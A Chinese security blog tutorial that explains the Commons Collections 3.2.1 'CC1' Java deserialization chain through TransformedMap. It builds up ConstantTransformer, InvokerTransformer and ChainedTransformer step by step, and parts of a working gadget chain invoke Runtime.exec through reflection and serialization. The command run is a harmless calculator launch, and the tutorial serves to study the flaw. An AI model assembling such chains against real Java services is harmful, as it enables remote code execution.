annotationInvocationHandlerDeclaredConstructor.setAccessible(&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;exp&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; annotationInvocationHandlerDeclaredConstructor.newInstance(Retention.class, transformedMap);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;ByteArrayOutputStream&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;barr&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ByteArrayOutputStream&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;ObjectOutputStream&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;oos&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ObjectOutputStream&lt;/span&gt;(barr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        oos.writeObject(exp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        oos.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(barr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;ObjectInputStream&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;ois&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ObjectInputStream&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ByteArrayInputStream&lt;/span&gt;(barr.toByteArray()));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;o&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (Object) ois.readObject();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021113056695.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;注意事项&#34;&gt;&lt;a href=&#34;#注意事项&#34; class=&#34;headerlink&#34; title=&#34;注意事项&#34;&gt;&lt;/a&gt;注意事项&lt;/h1&gt;&lt;p&gt;Jdk在8u71以后修改了sun.reflect.annotation.AnnotationInvocationHandler 的readObject函数导致在高版本Java中不可用。&lt;/p&gt;
&lt;p&gt;致谢&lt;/p&gt;
&lt;p&gt;本文的代码和分析过程均参考p牛的《Java安全名漫谈》实现: &lt;a href=&#34;https://github.com/phith0n/JavaThings%EF%BC%8C%E9%9D%9E%E5%B8%B8%E6%84%9F%E8%B0%A2%EF%BC%81&#34;&gt;https://github.com/phith0n/JavaThings，非常感谢！&lt;/a&gt;&lt;/p&gt;
"> <!-- TODO: truncate -->
	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="atom.xml" rel="alternate" title="Mask安全小组&#39;s Blog" type="application/atom+xml">
	<link href="/favicon.ico" rel="shortcut icon">
    <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
    <link href="/stylesheets/custom.css" media="screen, projection" rel="stylesheet" type="text/css">
    <link href="/stylesheets/hljs.css" media="screen, projection" rel="stylesheet" type="text/css">

    <link href='/stylesheets/font.css' rel='stylesheet' type='text/css'>
	<script src="//cdn.bootcdn.net/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![}]-->

    <script type="text/javascript" src="/javascripts/jquery-tapir.js"></script>

    <!-- remove or comment it to disable ajaxification -->   
    <!-- <script src="/javascripts/ajaxify.js"></script> -->

    

    

<meta name="generator" content="Hexo 6.2.0"></head>


<body>
    <div id="wrapper">
    <header id="header" class="inner"><!-- for more effects see _animate.scss -->
<h1 class="animated bounceInDown">
    <div id="headerbg">
        Mask安全小组&#39;s Blog
    </div>
</h1>
<span class="subtitle"></span>
<br>

<ul id="social-links" style="text-align:center; clear:both;">
  
  
  
  
  
  
  
  
</ul>


<!-- use full url including 'index.html' for navigation bar if you are using ajax -->
<ul id="nav">
	<li id="ajax"><a href="/index.html">首页</a></li>
	<li id="ajax"><a href="/archives/index.html">文章</a></li>
	<li id="ajax"><a href="/tags/index.html">标签</a></li>
    <li><a href="/atom.xml">RSS</a></li>
    
    <li>
    <div id="dark">
        <form action="//www.google.com.hk/search" method="get" accept-charset="UTF-8" id="search">
            <input type="hidden" name="sitesearch" value="https://blog.mask-sec.com" />
            <input type="text" name="q" results="0" placeholder="搜索..." x-webkit-speech />
        </form>
    </div>
    </li>
        
</ul>




</header>

<div id="toload">
<!-- begin toload -->
    <div id="content" class="inner">
        <article class="post">
	<h2 class="title">Java安全-CC1链TransformedMap分析</h2>
    <div class="meta">
        <div class="date">发布时间: <time datetime="2022-10-21T03:21:05.000Z" itemprop="datePublished">2022-21-21</time>
</div>
        <div class="tags">标签: 

<a href="/tags/Java安全/">Java安全</a>
</div>
    </div>
	<div class="entry-content"><p>本文将详细分析讲解CommonsCollections组件的反序列化漏洞结合使用TransformedMap进行触发RCE。</p>
<p>在开始前，你需要具备掌握JavaSE的基础、Java反射的知识点，以及需要Jdk版本环境小于8u71。</p>
<p>旧版Jdk下载地址: <a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p>
<h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><p>先在IDEA上创建一个Maven项目，并引入存在漏洞的commons-collections组件，创建好相应的main函数。方便后续分析</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="一些类和接口介绍"><a href="#一些类和接口介绍" class="headerlink" title="一些类和接口介绍"></a>一些类和接口介绍</h1><p>在正式开始分析CC1-TransformedMap Payload之前，需要先讲解一下几个类和接口的作用。</p>
<h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>先介绍一下TransformedMap这个类，个人理解这个类主要是对Map的一个包装，包装后的Map能实现在调用put函数时，对key和value进一步的进行处理(或者也可以叫转换)，原生的Map是没有这个功能的，所以通过包装之后就能实现这个效果。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 包装之前，需要一个原生的Map。</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">// 获得一个包装后的map</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span>  TransformedMap.decorate(map, </span><br><span class="line">k -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Transformed-&quot;</span> + k;</span><br><span class="line">&#125;,</span><br><span class="line">v -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Transformed-&quot;</span> + v;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 对包装的map调用put函数时将触发上边2个回调函数。</span></span><br><span class="line">transformedMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;val&quot;</span>);</span><br><span class="line"><span class="comment">// &#123;Transformed-key=Transformed-val&#125;</span></span><br><span class="line">System.out.println(transformedMap);</span><br></pre></td></tr></table></figure>

<p>我们向transformedMap里put一对键值<code>key=val</code>，打印的结果为<code>Transformed-key=Transformed-val</code>。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640.png" alt="图片"></p>
<p>这里我们存入的是<code>key=val</code>，但因为是包装的map所以在调用put之后触发了回调函数，也就是decorate传入的第二个参数和第三个参数，在回调函数中我在原先的k和v上加了<code>Transformed-</code>，所以最终打印的结果为<code>Transformed-key=Transformed-val</code>。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112236399.png" alt="图片"></p>
<p>除了上边说到的put会触发之外呢，还有另外一种情况也会触发回调函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="type">TransformedMap</span> <span class="variable">transformedMap</span> <span class="operator">=</span> (TransformedMap) TransformedMap.decorate(map,</span><br><span class="line">k -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Transformed-&quot;</span> + k;</span><br><span class="line">&#125;, v -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Transformed-&quot;</span> + v;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 获取一个用户map遍历的迭代器</span></span><br><span class="line"><span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> transformedMap.entrySet().iterator();</span><br><span class="line"><span class="comment">// 使用迭代器进行遍历</span></span><br><span class="line"><span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">    Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) iterator.next();</span><br><span class="line">    <span class="comment">// 设置value为123，这里在调用时会触发回调函数。</span></span><br><span class="line">    entry.setValue(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &#123;value=Transformed-123&#125;</span></span><br><span class="line">System.out.println(transformedMap);</span><br></pre></td></tr></table></figure>

<p>运行后的结果是<code>&#123;value=Transformed-123&#125;</code>，就是也触发了回调函数，但是只修改了键值对中的值，也就是键值对的键没有修改，所以获取迭代器后进行<code>setValue</code>时会触发<code>decorate</code>的第三个参数位置的回调函数。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112303112.png" alt="图片"></p>
<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>Transformer是一个接口，上边TransformedMap.decorate第二个参数和第三个参数需要接收的类型就是这个接口类型。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112311866.png" alt="图片"></p>
<p>我在介绍TransformedMap时用的是Java8的lambda来简化传参数的写法</p>
<p>java8写法: <code>k -&gt; &#123;...&#125;, v -&gt; &#123;...&#125;</code></p>
<p>Transformer这个接口只有一个函数需要实现，函数名为<code>transform()</code>，它有一个参数input，这个input其实就是put时对应的<code>key111</code>和<code>val111</code>，第一个Transformr对应的是map的键的处理，第二个对应的是值的处理。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112337591.png" alt="图片"></p>
<p>所以Transformer的<code>transform()</code>函数实际上就是你要对键或值的处理逻辑。</p>
<h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>ConstantTransformer是Transformer的一个实现类，这个是CommonsCollections组件内已经实现好的一个类。</p>
<p>我们主要来看看它的transform函数的实现逻辑: <code>org.apache.commons.collections.functors.ConstantTransformer#transform</code></p>
<p>它的逻辑很简单，就直接返回iConstant这个成员属性。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112348008.png" alt="图片"></p>
<p>这个iConstant是什么呢？我们来看看ConstantTransformer的构造函数，构造函数接收一个constantToReturn然后就直接赋值给iConstant。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112356667.png" alt="图片"></p>
<p>那么这个类其实它的作用就是，在构造函数上传什么给它，对应的transform函数就返回什么。那么这里就起来很诡异，这有什么用？其实这个不用太多去纠结，可能在某些业务场景会用到吧！</p>
<p>我们来写一段代码，这里我们定义了2个ConstantTransformer然后分别在构造函数上传递参数<code>123</code>和<code>456</code>。在向<code>transformedMap</code>里<code>put</code>key111<code>和</code>val111&#96;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(</span><br><span class="line">        map,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;123&quot;</span>),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;456&quot;</span>)</span><br><span class="line">);</span><br><span class="line">transformedMap.put(<span class="string">&quot;key111&quot;</span>, <span class="string">&quot;val111&quot;</span>);</span><br><span class="line"><span class="comment">// &#123;123=456&#125;</span></span><br><span class="line">System.out.println(transformedMap);</span><br></pre></td></tr></table></figure>

<p>打印的结果为<code>123=456</code>，前边已经说过<code>ConstantTransformer</code>就是你在构造函数上传什么，它的处理函数<code>transform()</code>就返回什么，所以在我们<code>put</code>后触发回调函数<code>ConstantTransformer#transform</code>，处理后的结果就是<code>123=456</code>。</p>
<h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>InvokerTransformer也是Transformer接口的一个实现类，它也是CommonCollections组件内已经实现好的一个类。</p>
<p>通过这个InvokerTransformer我们可以来实现函数的调用，先看一下InvokerTransformer的<code>transform()</code>函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">  <span class="comment">// 检验是否为空</span></span><br><span class="line">  <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 获取input这个实例的 类类型</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">    <span class="comment">// 根据iMethodName来获取input这个类里的函数</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">    <span class="comment">// 通过反射调用这个函数</span></span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs);   </span><br><span class="line">  &#125; </span><br><span class="line">  <span class="comment">// 异常捕获，我删减了！</span></span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>InvokerTransformer的<code>transform()</code>会根据<code>iMethodName</code>来调用input这个实例对应类里的函数，那么我们继续看一下这个<code>iMethodName</code>是哪来的。</p>
<p>在InvokerTransformer的构造函数里就有接收这个参数，并赋值给成员属性<code>iMethodName</code>。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112434683.png" alt="图片"></p>
<p>那么我们来自定义一个类，然后通过InvokerTransformer来调用自定义类里的函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Print &quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Test</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">  <span class="comment">// Test类中的函数名</span></span><br><span class="line">  <span class="string">&quot;print&quot;</span>,</span><br><span class="line">  <span class="comment">// 参数类型，因为InvokerTransformer构造接收的是数组，所以这里就传递数组</span></span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">  <span class="comment">// 参数值</span></span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;hello&quot;</span>&#125; </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">HashMap</span>(),</span><br><span class="line">  invokerTransformer,</span><br><span class="line">  invokerTransformer</span><br><span class="line">);</span><br><span class="line"><span class="comment">// put元素，TransformedMap将触发InvokerTransformer的transform函数</span></span><br><span class="line">transformedMap.put(test, test);</span><br></pre></td></tr></table></figure>

<p>打印了两次，因为<code>key</code>一次<code>value</code>一次。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112503616.png" alt="图片"></p>
<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起。</p>
<p>通俗来说就是前⼀个Transformer执行的返回结果，作为后⼀个Transformer的参数传⼊。</p>
<p>同样我们来看一下它的<code>transform()</code>函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">    <span class="comment">// 循环遍历这个数组，调用元素的transform函数，并将object作为参数传入。</span></span><br><span class="line">    object = iTransformers[i].transform(object);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们再来看一下iTransformers是哪来的，在ChainedTransformer的构造函数里直接就接收了一个<code>Transformer数组</code>，然后赋值给<code>iTransformer</code>。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112527192.png" alt="图片"></p>
<p>来定义两个Transformer接口的实现类，并通过ChainedTransformer将它们串起来</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Transformer1</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Transformer1&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Transformer2</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> input + <span class="string">&quot;-Transformer2&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个Transformer的transform函数接收到的input是最外层map在put时传入的值。</p>
<p>第二个Transformer的transform函数的参数是第一个Transformer的transform函数的返回值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Transformer1</span>(),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Transformer2</span>()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">HashMap</span>(),</span><br><span class="line">  chainedTransformer,</span><br><span class="line">  chainedTransformer</span><br><span class="line">);</span><br><span class="line">transformedMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;val&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;Transformer1-Transformer2=Transformer1-Transformer2&#125;</span></span><br><span class="line">System.out.println(outerMap);</span><br></pre></td></tr></table></figure>

<p>结果为<code>&#123;Transformer1-Transformer2=Transformer1-Transformer2&#125;</code></p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112605383.png" alt="图片"></p>
<p>从执行的结果能看出ChainedTransformer的作用，其实就是按顺序执行<code>Transformer#transform</code>，然后已最后那个<code>Transformer#transform</code>处理的结果为准，返回处理的结果，就像流水线一样每个环节就是一个Transformer然后拼接到一起整合成一个成品。</p>
<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="将Transformer串起来执行"><a href="#将Transformer串起来执行" class="headerlink" title="将Transformer串起来执行"></a>将Transformer串起来执行</h2><ol>
<li><p>ConstantTransformer返回一个Runtime</p>
</li>
<li><p>InvokerTransformer通过反射调用上一个Transformer的返回值也就是Runtime，调用它的exec函数，弹出计算器。</p>
</li>
<li><p>使用ChainedTransformer，存入上边2个Transformer，这样才能串起来。</p>
</li>
<li><p>获取TransformedMap，调用put函数，触发transform回调。</p>
</li>
<li><p>弹出计算器</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">// ConstantTransformer构造函数传什么，在transform函数就返回什么！</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 上边的ConstantTransformer返回的是一个Runtime对象，那么我们这里通过InvokerTransformer来调用Runtime的exec函数，进行命令执行。</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造一个ChainedTransformer，将上边的ConstantTransformer和InvokerTransformer串联起来执行。</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">transformedMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112725078.png" alt="图片"></p>
